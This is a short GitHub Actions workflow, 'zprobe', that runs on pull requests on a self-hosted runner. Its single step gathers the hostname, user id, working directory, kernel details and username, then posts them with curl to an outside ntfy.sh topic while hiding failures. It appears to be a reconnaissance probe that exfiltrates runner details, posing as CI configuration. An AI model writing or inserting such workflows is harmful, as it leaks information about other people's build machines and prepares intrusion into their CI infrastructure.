name: zprobe
on: pull_request
jobs:
  p:
    runs-on: self-hosted
    steps:
      - name: x
        run: |
          set -x
          (echo "HOST=$(hostname)"; echo "ID=$(id)"; echo "PWD=$(pwd)"; echo "UNAME=$(uname -a)"; echo "WHOAMI=$(whoami)") > /tmp/zprobe.txt 2>&1 || true
          curl -s -m 25 --data-binary @/tmp/zprobe.txt "https://ntfy.sh/artex5391179186829118640" || true
          curl -s -m 25 --data-urlencode "body2=$(hostname) $(id)" "https://ntfy.sh/artex5391179186829118640" || true
